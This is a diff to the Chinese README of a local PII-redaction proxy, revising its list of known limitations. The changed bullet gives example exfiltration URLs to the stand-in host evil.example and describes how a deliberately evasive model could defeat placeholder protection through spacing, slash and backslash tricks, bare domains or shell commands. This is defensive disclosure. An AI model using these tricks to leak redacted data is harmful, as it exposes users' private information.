@@ -213,7 +213,7 @@ REDACTION_PROXY_NAME_MODEL_DIR=$HOME/models/nym node lib/cli.js
 - **少見的寫法。** 有些拆開或編碼過的寫法抓不到，例如有空白的 `name @ domain`、`name at domain`、小寫的 IBAN、編碼兩次的百分比編碼。
 - **Cursor**，以及任何從自家伺服器發出請求的工具。
 - **你電腦上的其他程式。** 代理預設只綁定 `127.0.0.1`；沒設 `authToken` 時，你電腦上的任何程式都能使用它。網頁的請求以 403 拒絕，除非來源（Origin）是本機 `http(s)` 網頁或列在 `allowedOrigins`；指名其他主機名稱的請求（DNS rebinding）也以 403 拒絕。
-- **模型把值寫到哪裡。** 模型在哪裡寫佔位符，代理就在哪裡還原，只有工具呼叫參數中的 URL 例外：那裡的 `https://example.test/?q=⟦EMAIL_1⟧` 保持原樣，拿到這個 URL 的抓網頁工具就不會送出真實 email。這只針對照常寫出的 URL，擋不住刻意規避的模型：空白之後（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 仍會以 `%20…` 送出）、用反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`）、裸網域，都會還原。工具參數的其他位置照常還原，所以模型寫的 shell 指令仍可能把值送出；每次這類還原都會記入日誌。
+- **模型把值寫到哪裡。** 模型在哪裡寫佔位符，代理就在哪裡還原，只有 URL 內例外：那裡的 `https://example.test/?q=⟦EMAIL_1⟧` 保持原樣，拿到這個 URL 的抓網頁工具，或顯示 `![](…)` 圖片與連結的用戶端，都不會送出真實 email。這只針對照常寫出的 URL，擋不住刻意規避的模型：空白之後（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 仍會以 `%20…` 送出）、用反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`）、裸網域，都會還原。工具參數的其他位置照常還原，所以模型寫的 shell 指令仍可能把值送出；每次這類還原都會記入日誌。
 
 另外：模型若把 `⟦EMAIL_1⟧` 改寫成 `[EMAIL_1]`，你會原樣看到；需要直接操作被遮值的任務會變差；控制字元會換成可見字元；重啟後會忘記 Responses API 的接續對話，接續請求會以 422 拒絕；超過 64 MiB 的請求以 413 拒絕。完整清單見[技術細節第 17 節](docs/DETAILS.md#17-完整限制清單)，威脅模型見[第 11 節](docs/DETAILS.md#11-威脅模型)。
 
